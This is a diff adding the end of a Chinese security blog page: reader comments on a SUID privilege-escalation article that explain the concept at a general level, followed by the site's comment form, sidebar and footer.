+                    <div class="fn"><a href="../index.html" target="_blank" rel="nofollow noopener">phithon</a></div>
+                    <p>@路人甲 如果普通用户就可以做，那我们还找nmap这样具有suid权限的程序干嘛呢？你可能还需要再理解提权这个事情本身是什么意思，suid究竟是什么。</p>
+                    <span class="comment-time">时间: 2020-03-11 16:21</span>
+                    <span class="comment-reply"><a href="#comment-3487" onclick="reply_to('3487','phithon')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3876">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">莫莫</a></div>
+                    <p>@路人甲 跟哪里编译没关系，suid看的是文件的拥有者。你用 www-data 编译，之后给他 chown root.root 了也是一样</p>
+                    <span class="comment-time">时间: 2022-06-01 15:56</span>
+                    <span class="comment-reply"><a href="#comment-3876" onclick="reply_to('3876','莫莫')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3483">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">Sh4Nn0n</a></div>
+                    <p>这两天做靶机刚好遇到了suid提权的问题, 还涉及到了bash -p的操作, 看完之后帮助很大,感谢p牛大大</p>
+                    <span class="comment-time">时间: 2020-02-25 20:33</span>
+                    <span class="comment-reply"><a href="#comment-3483" onclick="reply_to('3483','Sh4Nn0n')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3498">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">eval</a></div>
+                    <p>@Sh4Nn0n vulnhub里面的it&#x27;s october这个靶机里面就有，不知道你说的是不是这个。</p>
+                    <span class="comment-time">时间: 2020-04-14 13:37</span>
+                    <span class="comment-reply"><a href="#comment-3498" onclick="reply_to('3498','eval')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+            
+            </ol>
+            
+        </div>
+
+        <div id="reply"></div>
+        <div id="comment-place">
+            <div id="comment-post" class="respond none-resize">
+             <div id="respond">
+                <h3 id="response">添加新评论</h3>
+                <form method="post" id="comment-form" role="form" action="#comments">
+                    <p>
+                        <label for="author" class="required">称呼</label>
+                        <input type="text" name="nickname" placeholder="昵称" maxlength="64" required id="id_nickname">
+                    </p>
+                    <p>
+                        <label for="mail">Email</label>
+                        <input type="text" name="email" placeholder="邮箱（可留空）" maxlength="254" id="id_email">
+                    </p>
+                    <p>
+                        <label for="url">网站</label>
+                        <input type="text" name="url" placeholder="链接（可留空）" maxlength="200" id="id_url">
+                    </p>
+                    <p>
+                        <label for="textarea" class="required">内容</label>
+                        <textarea name="content" cols="40" rows="6" required id="id_content">
+</textarea>
+                    </p>
+                    <p>
+                        <label style="float:left;">验证码</label>
+                        <div class="row gx-2" style="margin-top: 8px"><div class="col-6"><input autocomplete="off" id="id_captcha_1" name="captcha_1" type="text" placeholder="验证码" /> <input id="id_captcha_0" name="captcha_0" type="hidden" value="b1df9f39b82914be0b9020afb7f8cef7c951ea10" />
+</div><div class="col-6">
+<img src="../captcha/image/b1df9f39b82914be0b9020afb7f8cef7c951ea10/index.png" alt="captcha" class="captcha" /></div></div>
+                    </p>
+                    <p>
+                        <button type="submit" class="submit">提交评论</button>
+                        <input type="hidden" name="parent" id="id_parent">
+                        <input type="hidden" name="archive" value="451" id="id_archive">
+                        <input type="hidden" name="csrfmiddlewaretoken" value="ZHZr2gCQ7PRxTy5qKsSZOsFUs6f3Z7KjLfniAldzvb5gr6TOMtPKLVIZNtweyJWB">
+                    </p>
+                </form>
+                </div>
+            </div>
+        </div>
+
+    </div>
+    
+
+
+
+<div  class="col-5 columns" id="sidebar" role="complementary">
+
+  <div class="widget widget_search">
+    <h3>搜索</h3>
+    <form action="https://www.leavesongs.com/search/" id="searchform" method="get">
+        <input type="text" id="searchkey" name="keyword" value="" class="searchkey" placeholder="Search..."/>
+        <button type="submit"  id="searchsubmit">Go</button>
+    </form>
+  </div>
+
+  
+  <div class="widget">
+	<h3 class="widget-title">最新评论</h3>
+	<ul class="widget-list" id="recent-comment">
+    
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>木木</cite>：<a href="../THINK/europe-trip-2022.html#comment-4523">虽然物价对比不出什么，但是还是觉得很高昂</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4520">肯德基疯狂星期四！ 疯狂星期四！  https://m.kfc.com.cn/wechatco...</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4519">小猪咪小猪咪小猪咪</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>sam</cite>：<a href="javascript-prototype-pollution-attack.html#comment-4518">还得是P神，文章一看就懂</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>程序</cite>：<a href="discuz72-sql-injection.html#comment-4517">很不错的文章</a></div>
+        </li>
+    
+    </ul>
+  </div>
+
+  <div class="widget widget-category">
+	<h3>分类</h3>
+	<ul id="blogsort" class="widget-list">
+    
+    
+    <li>
+        <a href="../sort/PENETRATION.html">网络安全<em>143</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/C.html">C/C++<em>32</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/THINK.html">心得与体会<em>24</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/PYTHON.html">Python<em>19</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/SHARE.html">资源分享<em>16</em></a>
+    </li>
+    
+    </ul>
+  </div>
+
+  <div class="widget widget-tag">
+	<h3>随机标签</h3>
+	<div class="tag-cloud">
+        
+        
+        <a rel="tag" href="../tag/%E4%BA%8C%E6%89%8B%E5%95%86%E5%93%81.html">二手商品</a>
+        
+        <a rel="tag" href="../tag/%E7%9F%A5%E4%B9%8E.html">知乎</a>
+        
+        <a rel="tag" href="../tag/sqlite_bind.html">sqlite_bind</a>
+        
+        <a rel="tag" href="../tag/flashxss.html">flashxss</a>
+        
+        <a rel="tag" href="../tag/%E7%BB%87%E6%A2%A6.html">织梦</a>
+        
+        <a rel="tag" href="../tag/Go.html">Go</a>
+        
+        <a rel="tag" href="../tag/Docker.html">Docker</a>
+        
+        <a rel="tag" href="../tag/%E5%85%BC%E5%AE%B9%E6%80%A7.html">兼容性</a>
+        
+        <a rel="tag" href="../tag/Linux.html">Linux</a>
+        
+        <a rel="tag" href="../tag/php-fpm.html">php-fpm</a>
+        
+        <a rel="tag" href="../tag/goahead.html">goahead</a>
+        
+        <a rel="tag" href="../tag/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89.html">条件竞争</a>
+        
+        <a rel="tag" href="../tag/emlog%E6%8F%92%E4%BB%B6.html">emlog插件</a>
+        
+        <a rel="tag" href="../tag/%E5%9B%A2%E9%98%9F.html">团队</a>
+        
+        <a rel="tag" href="../tag/%E8%87%AA%E5%AE%9A%E4%B9%89%E8%B5%84%E6%BA%90.html">自定义资源</a>
+        
+        <a rel="tag" href="../tag/joomla.html">joomla</a>
+        
+        <a rel="tag" href="../tag/%E6%B1%89%E5%8C%96.html">汉化</a>
+        
+        <a rel="tag" href="../tag/%E9%93%BE%E8%A1%A8.html">链表</a>
+        
+        <a rel="tag" href="../tag/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5.html">环境变量注入</a>
+        
+        <a rel="tag" href="../tag/%E5%A4%9A%E7%BA%BF%E7%A8%8B.html">多线程</a>
+        
+        <a rel="tag" href="../tag/%E4%B8%8A%E7%BD%91.html">上网</a>
+        
+        <a rel="tag" href="../tag/wopus.html">wopus</a>
+        
+        <a rel="tag" href="../tag/%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2.html">进制转换</a>
+        
+        <a rel="tag" href="../tag/audit.html">audit</a>
+        
+        <a rel="tag" href="../tag/htaccess.html">htaccess</a>
+        
+        <a rel="tag" href="../tag/%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE.html">开源项目</a>
+        
+        <a rel="tag" href="../tag/scrapy.html">scrapy</a>
+        
+        <a rel="tag" href="../tag/yxcms.html">yxcms</a>
+        
+        <a rel="tag" href="../tag/%E7%AD%94%E6%A1%88.html">答案</a>
+        
+        <a rel="tag" href="../tag/tea.html">tea</a>
+        
+    </div>
+  </div>
+
+  <div class="widget widget-recent-entries">
+	<h3 class="widget-title">热门日志</h3>
+	<ul id="hotlog" class="widget-list">
+    
+    
+        <li><a href="../other/tinger.html">About.Me</a></li>
+    
+        <li><a href="detect-django.html">如何判断目标站点是否为Django开发</a></li>
+    
+        <li><a href="webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></li>
+    
+        <li><a href="webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></li>
+    
+        <li><a href="php-filter-magic.html">谈一谈php://filter的妙用</a></li>
+    
+    </ul>
+  </div>
+  
+
+</div>
+</div>
+
+<div id="footer">
+	<!-- copyright -->
+	<div class="container">
+		<div class="row remove-bottom">
+			<div class="col-6 columns">
+			<h3>Little About</h3>
+			<p>Phithon 非强迫症小青年  <br>
+现居先 <br>
+爱好：种花、买书、收藏明信片 <br>
+欢迎各大组织收留 <br>
+E-mail：root@leavesongs.com </p>
+			</div>
+
+			<div class="col-10 columns">
+
+				<h3 class="mobile-hide">Follow me</h3>
+        <div id="social-links">
+          <a href="http://weibo.com/101yx" class="sweibo" target="_blank" title="新浪微博">新浪微博</a>
+          <a href="javascript:alert(/没有腾讯微博哟/)" class="qweibo" target="_blank" title="腾讯微博">腾讯微博</a>
+          <a href="javascript:alert(/墙外有什么/);window.open('http://google.com')" class="google" target="_blank" title="墙外的世界">google+</a>
+          <a href="https://github.com/phith0n" class="github" target="_blank" title="Github">github</a>
+          <a href="javascript:confirm(/mailto:root#leavesongs.com/)" class="mail" target="_blank" title="私信给我">私信给我</a>
+          <a href="../feed/index.rss" target="_blank" class="rss" title="离别歌">RSS订阅</a>
+        </div>
+        <div class="bot-line"></div>
+				<p class="copyright">
+	Copyright &copy; Powered by talkbook
+				&nbsp;&nbsp;<i>Designed and built with all the love in the world by <a href="../index.html" target="_blank">Phithon</a> && deepsky </i>
+                    <a href="../index.html">更换模板</a>
+				</p>
+			</div>
+		</div>
+	</div>
+	<!-- /copyright -->
+</div>
+<a href="#" id="go-top">Top ↑</a>
+<script src="https://cdn.staticfile.org/jquery/1.12.4/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/jquery.appear/0.4.1/jquery.appear.min.js"></script>
+<script src="../static/deep/js/common_tpl.js" type="text/javascript"></script>
+<script src="../static/deep/js/config.js"></script>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-FF5KPQ1CZ6"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-FF5KPQ1CZ6');
+</script>
+
+<script src="https://cdn.staticfile.org/fancybox/2.1.7/js/jquery.fancybox.min.js"></script>
+<script>
+$(document).ready(function () {
+    $(".entry a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $(".entry img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+
+</body>
+
+</html>
